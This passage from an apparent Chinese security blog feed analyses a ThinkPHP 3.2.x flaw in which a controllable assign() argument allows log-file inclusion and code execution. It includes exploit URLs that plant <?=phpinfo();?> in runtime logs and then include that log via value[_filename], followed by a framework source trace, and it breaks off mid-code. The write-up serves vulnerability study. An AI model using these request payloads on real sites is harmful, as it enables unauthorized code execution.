punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span>           <span class="token punctuation">}</span>       <span class="token punctuation">}</span>       <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">linkID</span><span class="token punctuation">[</span><span class="token variable">$linkNum</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里控制 <code>$this-&gt;config</code> 来连接数据库，用 mysql 类来实例化,接着去执行前面拼接的<code>DELETE</code>SQL语句</p><p>因此我们只需要在 Mysql 下配置好数据库配置即可</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="http://c.biancheng.net/view/8223.html">PHP serialize()与unserialize()：序列化与反序列化</a></p><p><a href="http://www.yongsheng.site/2021/08/30/ThinkPHP3.2.3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP 3.2.3 反序列化&amp;sql注入漏洞分析 | Y0ng的博客</a></p><p><a href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">ThinkPHP v3.2.* （SQL注入&amp;文件读取）反序列化POP链</a></p><p><a href="https://blog.csdn.net/LYJ20010728/article/details/119551186">ThinkPHP3.2.x （SQL注入&amp;文件读取）反序列化POP链_H3rmesk1t的博客-CSDN博客</a></p><p><a href="https://blog.riskivy.com/%e6%8c%96%e6%8e%98%e6%9a%97%e8%97%8fthinkphp%e4%b8%ad%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%88%a9%e7%94%a8%e9%93%be/">挖掘暗藏ThinkPHP中的反序列利用链 - 斗象能力中心</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> php </tag>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计—ThinkPHP3.2.X远程代码执行</title>
      <link href="posts/57719.html"/>
      <url>posts/57719.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>该漏洞是在受影响的版本中，业务代码中如果模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。个人感觉这个漏洞虽然不如thinkphp本体的一些RCE漏洞影响范围大，但也算是提供了一个思路，对基于某些框架二次开发的系统，寻找其不规范的方法调用的思路还是值得学习的。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>控制器添加test方法，写入模板赋值assign的 Demo</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;style type="text/css"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;thinkad id="ad_55e75dfae343f5a1"&gt;&lt;/thinkad&gt;&lt;script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"&gt;&lt;/script&gt;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为该漏洞利用的assign函数需要模板渲染，所以需要对应的模板文件，与demo相对应的文件路径：</p><p>view下创建一个Index目录，然后在Index目录下面新建test.html文件进行视图渲染，文件内容随意<br>目录：\Application\Home\View\Index\test.html</p><p><strong>创建日志文件：</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http://192.168.1.8/index.php?c=<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php<span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>// 没有给调用的模块参数，默认为Home， 控制器报错，日志在 Application/Runtime/Logs/Home 下面    http://192.168.1.8/index.php?m=--&gt;<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>// 模块报错， 日志在 Application/Runtime/Logs/Common下面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>日志文件目录：</strong></p><p>开启debug</p><pre class="line-numbers language-none"><code class="language-none">请求不报错 日志文件在 对应的模块下面 比如Home模块  路径：Application/Runtime/Logs/Home下请求会报错 如果是模块错误  日志文件在 Application/Runtime/Logs/Common下如果是控制器或者方法错误 日志文件在对应的模块下面 比如Home模块 路径：Application/Runtime/Logs/Home 下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关闭debug</p><pre class="line-numbers language-none"><code class="language-none">请求不会报错 不会记录日志请求会报错 保存的位置和开启debug一致 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>包含日志文件：</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">http</span><span class="token punctuation">:</span><span class="token comment">//192.168.1.8/index.php?m=Home&amp;c=Index&amp;a=test&amp;value[_filename]=./Application/Runtime/Logs/Home/21_06_08.log</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>Application/Home/Controller/IndexController.class.php</p><p>assign方法中第一个变量可控</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>跟进assign函数</p><p>ThinkPHP/Library/Think/Controller.class.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">assign</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">view</span><span class="token operator">-&gt;</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>调用的是<code>ThinkPHP/Library/Think/View.class.php</code>中的assign函数，</p><p>此时进入else分支，我们传进去的<code>$value</code>被赋值给<code>$this-&gt;tVar[$name]</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">assign</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">tVar</span>   <span class="token operator">=</span>  <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">tVar</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">tVar</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后返回， 无参调用 display 函数，跟进display函数</p><p>调用的是<code>ThinkPHP/Library/Think/View.class.php</code>的display函数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">display</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">view</span><span class="token operator">-&gt;</span><span class="token function">display</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>继续跟进</p><p>开始解析并获取模板文件内容，此时模板文件路径和内容为空</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">display</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">G</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'viewStartTime'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 视图开始标签</span>    <span class="token class-name static-context">Hook</span><span class="token operator">::</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'view_begin'</span><span class="token punctuation">,</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 解析并获取模板内容</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 输出模板内容</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 视图结束标签</span>    <span class="token class-name static-context">Hook</span><span class="token operator">::</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'view_end'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进入<code>ThinkPHP/Library/Think/View.class.php</code>的fetch函数后，</p><p>这里会先判断模板存不存在，模板文件不存在直接返回，所以开始需要创建模板文件</p><p>接着判断是不是php类型模板，不是进入else分支。</p><p>接着$params 被赋值，var即为为我们传进去的日志路径，file为模板文件的路径。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$templateFile</span>   <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseTemplate</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 模板文件不存在直接返回</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">E</span><span class="token punctuation">(</span><span class="token function">L</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_TEMPLATE_NOT_EXIST_'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">':'</span><span class="token operator">.</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">defined</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'THEME_PATH'</span><span class="token punctuation">)</span> <span class="token keyword">or</span>    <span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'THEME_PATH'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getThemePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 页面缓存</span>    <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ob_implicit_flush</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span> <span class="token operator">==</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'TMPL_ENGINE_TYPE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 使用PHP原生模板</span>        <span class="token variable">$_content</span>   <span class="token operator">=</span>   <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token comment">// 模板阵列变量分解成为独立变量</span>        <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">tVar</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 直接载入PHP模板</span>        <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_content</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token keyword">include</span> <span class="token variable">$templateFile</span><span class="token punctuation">:</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?&gt;'</span><span class="token operator">.</span><span class="token variable">$_content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token comment">// 视图解析标签</span>        <span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'var'</span><span class="token operator">=&gt;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">tVar</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token operator">=&gt;</span><span class="token variable">$templateFile</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'content'</span><span class="token operator">=&gt;</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'prefix'</span><span class="token operator">=&gt;</span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name static-context">Hook</span><span class="token operator">::</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'view_parse'</span><span class="token punctuation">,</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 获取并清空缓存</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">ob_get_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 内容过滤标签</span>    <span class="token class-name static-context">Hook</span><span class="token operator">::</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'view_filter'</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 输出模板文件</span>    <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着进入<code>ThinkPHP/Library/Think/Hook.class.php</code>的listen函数，经过一些判断，进入exec函数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">static</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">listen</span><span class="token punctuation">(</span><span class="token variable">$tag</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$params</span><span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$tags</span><span class="token punctuation">[</span><span class="token variable">$tag</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">'Start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token function">trace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'[ '</span><span class="token operator">.</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">' ] --START--'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'INFO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$tags</span><span class="token punctuation">[</span><span class="token variable">$tag</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token constant">APP_DEBUG</span> <span class="token operator">&amp;&amp;</span> <span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'_start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$result</span> <span class="token operator">=</span>   <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$tag</span><span class="token punctuation">,</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                 <span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'_end'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token function">trace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Run '</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">' [ RunTime:'</span><span class="token operator">.</span><span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'_start'</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'_end'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'s ]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'INFO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token comment">// 如果返回false 则中断插件执行</span>                 <span class="token keyword">return</span> <span class="token punctuation">;</span>             <span class="token punctuation">}</span>         <span class="token punctuation">}</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 记录行为的执行日志</span>             <span class="token function">trace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'[ '</span><span class="token operator">.</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">' ] --END-- [ RunTime:'</span><span class="token operator">.</span><span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">'Start'</span><span class="token punctuation">,</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">'End'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'s ]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'INFO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span>     <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着exec函数把<code>$params</code> 带进<code>ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php</code>的run函数处理</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">static</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$tag</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token variable">$params</span><span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Behavior'</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">// 行为扩展必须用run入口方法</span>        <span class="token variable">$tag</span>    <span class="token operator">=</span>   <span class="token string single-quoted-string">'run'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$addon</span>   <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$addon</span><span class="token operator">-&gt;</span><span class="token variable">$tag</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$_data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token variable">$engine</span>             <span class="token operator">=</span>   <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'TMPL_ENGINE_TYPE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$_content</span>           <span class="token operator">=</span>   <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span>    <span class="token operator">=</span>   <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'TMPL_CACHE_PREFIX'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string 